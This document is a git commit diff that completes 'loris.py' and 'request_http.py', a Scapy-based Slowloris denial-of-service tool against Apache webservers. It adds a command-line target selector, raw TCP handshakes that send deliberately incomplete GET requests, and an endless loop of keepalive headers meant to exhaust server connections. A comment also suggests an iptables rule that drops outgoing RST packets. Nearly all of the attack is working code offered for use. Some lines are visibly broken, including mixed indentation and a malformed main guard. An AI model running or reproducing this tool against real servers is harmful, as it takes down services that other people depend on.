93e09a7437706d819cac0ea9b0cfaf899aa5c44e
matman26 <a.matheus26@hotmail.com>
2019-02-10 02:28:32 +0100

    Finished loris.py and request_http.py

--- loris.py
+++ loris.py
@@ -4,6 +4,7 @@
 from scapy.all import *
 from request_http import *
 import time
+import argparse
 import random
 
 # TITLE: loris.py
@@ -12,13 +13,32 @@ import random
 # and also have a few variables and lists containing data pertaining to each
 # individual connection
 
+# Parser for the command line
+parser = argparse.ArgumentParser(description="A new Slowloris implementation on Scapy; low bandwidthh DoS attack against Apache webservers.")
+parser.add_argument('host', nargs="?", help="Target for the Attack.")
+parser.add_argument('-p', '--port', default=80, help="Port of webserver, usually 80", type=int)
+parser.add_argument('-s', '--sockets', default=150, help="Number of sockets to use", type=int)
+parameters = parser.parse_args()
+
+if len(sys.argv) <= 1:
+	parser.print_help()
+	sys.exit(1)
+
+if not parameters.host:
+	print("[-] Please specify the target IP address.")
+	parser.print_help()
+	sys.exit(1)
+
+get = ("GET /14 HTTP/1.1\r\n") # Incomplete GET
+keepalive_header = "X-a: {}\r\n".format(42).encode("utf-8") # Random number to keepalive
+
 # Since Scapy goes a little bit more lower-level than the regular sockets library
 # for python ( we are managing TCP connections without a logical layer of abstraction )
 # some data structures should be set in place such that TCP rules are followed:
 # - Sequence and Acknowledgment numbers should be watched closely
 # - We probably can't check the current TCP connection's livelihood without sending another packet,
 #   so we'll take a more practical approach and periodically refresh connections.
-# - Connections will be refreshed by sending a random integer in the HTTP Header
+# - Connections will be refreshed by sending an integer in the HTTP Header
 # - GET Requests are incomplete (we need to send two end-of-line characters to finish
 #   a request) , only one of the end-of-line characters will be sent
 # - If requests are sent unfinished, the server may assume we have a slow Internet
@@ -28,41 +48,40 @@ import random
 #   side may be exhausted, effectively DoS'ing the HTTP service
 
 def main():
-    ip_address = "35.204.165.14"
-    #ip_address = "asdkappadue.it"
+    ip_address = parameters.host
+    #ip_address = "35.204.165.14"
     port = random.randint(1024,6000) # 4213 
     ip = IP(dst=ip_address)
-    server_port=80
-    list_size = 150
+    server_port = parameters.port
+    list_size = parameters.sockets
     port_list = list(range(port, port + list_size))
-
-    seqAckList = []
-    seqNumList = []
-
-    # The data structures are bound to be changed somewhat in the final version
-    for _ in range(list_size):
-        seqNumList.append(1) #init of seq numb
-        seqAckList.append(1) #init of ack numb
-
     print(port_list)
+    seqAckList = [None] * list_size
+    seqNumList = [None] * list_size
 
     # This will initialise each individual TCP socket
+    print("[+] Initializing " + str(list_size)+ " Sockets")
     for p in range(list_size):
-        seqNumList[p], seqAckList[p] = httpRequest(ip_address,port_list[p], seqNumList[p])
-    
-    # This treatment will probably be changed later
-    for n in range(0):
+	httpAck = httpRequest(ip_address,p+port)
+	seqAckList[p] = httpAck.ack
+	seqNumList[p] = httpAck.seq + utf8len(get)
+     
+    # This keeps refreshing HTTP connections
+    # The acknowledgment numbers remain the same (no data being received from the server)
+    # The sequence numbers keep being incremented by the size of the last payload
+    while True:
+    	print("[+] Sending " + str(list_size) + " keepalive headers")
 	for p in range(list_size):
-            ACK = ip/TCP(sport=p,
-                         dport=server_port,
-                         flags="A",
-                         seq=seqNumList[p],
-                         ack=seqAckList[p])
-            MYNUMBER=ACK/"X-a: {}\r\r".format(random.randint(1,5000)).encode("utf-8")
-            answerMyNumber = sr1(MYNUMBER)
-            seqNumlist[p]+= 1
-            seqAcklist[p] = answerMyNumber.seq
-        
-if __name__== "__main__":
-    main()
+		    ACK = ip/TCP(sport=port+p,
+				 dport=server_port,
+				 flags="PA",
+				 ack=seqAckList[p],
+				 seq=seqNumList[p])
 
+		    DATA_SENT=ACK/keepalive_header
+		    send(DATA_SENT,verbose=False)
+		    seqNumList[p]+= utf8len(keepalive_header)
+	time.sleep(10)        
+
+if _name_ == "_main_":
+	main()
--- request_http.py
+++ request_http.py
@@ -1,9 +1,8 @@
 #!/usr/bin/env python
 # Imports
-# from scapy.layers import http
 from scapy.all import *
-import scapy_http.http
 import random
+import time
 
 # TITLE: request_http.py
 # AUTHORS: Matheus Augusto da Silva; Alessandro Montaldo
@@ -12,49 +11,33 @@ import random
 # iptables -A OUTPUT -p tcp --tcp-flags RST RST -j DROP
 
 # This function sends a GET Request in HTTP 1.1 after the TCP 3-way handshake and
-# returns some information on the state of the TCP connection
+# returns information on the state of the TCP connection
 
-# This handles HTTP responses from the server
-#def handle(pkt):
-    #if pkt.haslayer(scapy_http.http.HTTPRequest):
-        #pkt.show()
+# This returns the length of the packet we just sent (to update the sequence numbers later)
+def utf8len(s):
+	return len(s.encode('utf-8'))
 
-# Make a TCP SYN
+# This makes a TCP Three-way Handshake and returns the last packet sent(Incomplete GET Request)
 def httpRequest(ip_address,source_port,sequence_number=42): 
-    #ip_address="35.204.58.85"    # Alessandro's server
-    #ip_address="192.168.33.10"    # Matheus' VM (see Vagrantfile)
-    #ip_address="35.204.165.14"
-    #source_port = random.randrange(1024,6500)
-
-    print('httpRequest fuct: port =', source_port, ' seq =', sequence_number)
-
     server_port=80                # http port
     ip = IP(dst=ip_address)       # IP Packet 
 
-    get = ("GET / HTTP/1.1\r\nHost: "
-    + ip_address
-    + "\r\nUser-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:43.0) Gecko/20100101 Firefox/43.0 Iceweasel/43.0.4"
-    + "\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,/;q=0.8"
-    + "\r\nAccept-Language: en-US,en;q=0.5"
-    + "\r\nAccept-Encoding: gzip, deflate"
-    + "\r\nConnection: keep-alive\r\n"
-    #+ "\r\nConnection: keep-alive"
-    )
+    # GET Request missing the last line break character
+    get = ("GET /14 HTTP/1.1\r\n")
 
     # The TCP 3-way handshake rules must be followed. As such,
     # we begin by sending a TCP packet with the S (or SYN) flag set.
-    SYN = ip/TCP(sport=source_port, dport=server_port, flags="S", seq=sequence_number) 
+    SYN = ip/TCP(sport=source_port, dport=server_port, flags="S", seq=42) 
 
     # Send SYN and wait for SYNACK as response
-    #SYN.show()
-    SYNACK = sr1(SYN)
+    SYNACK = sr1(SYN,verbose=False,retry=3,timeout=2)
+    myack=SYNACK.seq + 1
 
-    # Send ACK and finally HTTP GET, sniff for the resultACK = ip/TCP(sport=SYNACK.dport, dport=server_port, flags="A", seq=SYNACK.ack, ack=(SYNACK.seq+1))
-    ACK = ip/TCP(sport=source_port, dport=server_port, flags="A", seq=SYNACK.ack, ack=(SYNACK.seq+1))
-    GET = ip/TCP(sport=source_port, dport=server_port, seq=ACK.seq, flags = 24 , ack=(ACK.ack))/get
-    send(ACK)
-    REPONE =sr1(GET) 
-    SECACK = ip/TCP(sport=source_port , dport=server_port, flags="A", seq=REPONE.ack, ack=(REPONE.seq+1))
-    REPTWO = sr1(SECACK)
-    return REPTWO.seq , REPTWO.ack
-    #sniff(filter="tcp and port 80", store=False, prn=handle) # we'll improve on this later 
+    # Send ACK and finally HTTP GET
+    ACK = ip/TCP(sport=source_port, dport=server_port, flags="A", seq=SYNACK.ack, ack=myack)
+    send(ACK,verbose=False)
+    GET = ip/TCP(sport=source_port, dport=server_port, seq=SYNACK.ack, flags = "PA" , ack=myack)/get
+    send(GET,verbose=False) 
+    
+    # Return GET to set up the correct Sequence and Acknowledgement Number for each socket on main
+    return GET
